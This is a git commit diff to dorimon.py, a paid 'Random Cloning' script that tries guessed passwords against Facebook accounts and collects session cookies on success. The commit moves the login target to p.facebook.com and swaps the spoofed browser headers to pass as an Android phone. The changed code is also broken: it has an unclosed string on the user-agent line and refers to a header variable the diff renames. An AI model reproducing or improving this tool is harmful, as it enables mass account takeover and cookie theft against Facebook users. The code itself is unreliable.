86bc2ae3883593bb96fbc9ed58a7d953b4d3e505
denjar223 <141472061+denjar223@users.noreply.github.com>
2023-11-01 01:43:48 +0600

    Update dorimon.py

--- dorimon.py
+++ dorimon.py
@@ -137,7 +137,7 @@ logo=(f"""
 \x1b[38;5;46m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆
 \033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mDeveloper \033[1;31m●\x1b[38;5;46mMr.Roton
 \033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mFacebook  \033[1;31m●\x1b[38;5;46mMr.Roton
-\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mVersion  \033[1;31m ●\x1b[38;5;46m0.8
+\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mVersion  \033[1;31m ●\x1b[38;5;46m0.9
 \033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mTools  \033[1;31m   ●\x1b[38;5;46mRandom Cloning
 \033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mType  \033[1;31m    ●\x1b[38;5;46mPaid
 \x1b[38;5;50m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆""")
@@ -206,7 +206,7 @@ def b(uid,pwx,tl):
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
-            free_fb = session.get('https://mbasic.facebook.com').text
+            free_fb = session.get('https://p.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -217,28 +217,27 @@ def b(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {
- 		   'authority': 'web.facebook.com',
-  		  'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-  		  'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+            headers = {
+		    'authority': 'p.facebook.com',
+		    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+		    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
   		  'cache-control': 'max-age=0',
- 		   'dpr': '2.700000047683716',
- 		   'referer': 'https://www.google.com/',
-  		  'sec-ch-prefers-color-scheme': 'light',
- 		   'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="116", "Microsoft Edge";v="109"',
-  		  'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="116.0.5813.218", "Microsoft Edge";v="109.0.1569.61"',
-   		 'sec-ch-ua-mobile': '?0',
-   		 'sec-ch-ua-model': '"POCO M2 Pro"',
-   		 'sec-ch-ua-platform': '"macOS"',
-  		  'sec-ch-ua-platform-version': '""',
-		    'sec-fetch-dest': 'document',
+  		  'dpr': '2.700000047683716',
+ 		   'sec-ch-prefers-color-scheme': 'light',
+ 		   'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+   		 'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
+		    'sec-ch-ua-mobile': '?1',
+  		  'sec-ch-ua-model': '"POCO M2 Pro"',
+		    'sec-ch-ua-platform': '"Android"',
+  		  'sec-ch-ua-platform-version': '"12.0.0"',
+  		  'sec-fetch-dest': 'document',
 		    'sec-fetch-mode': 'navigate',
- 		   'sec-fetch-site': 'cross-site',
-  		  'sec-fetch-user': '?1',
-    		'upgrade-insecure-requests': '1',
-   		 'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5813.218 Safari/537.36 Edg/109.0.1569.61',
-  		  'viewport-width': '980',}
-            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+ 		   'sec-fetch-site': 'none',
+ 		   'sec-fetch-user': '?1',
+		    'upgrade-insecure-requests': '1',
+ 		   'user-agent': 'pro,
+		    'viewport-width': '980',}
+            lo = session.post('https://p.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
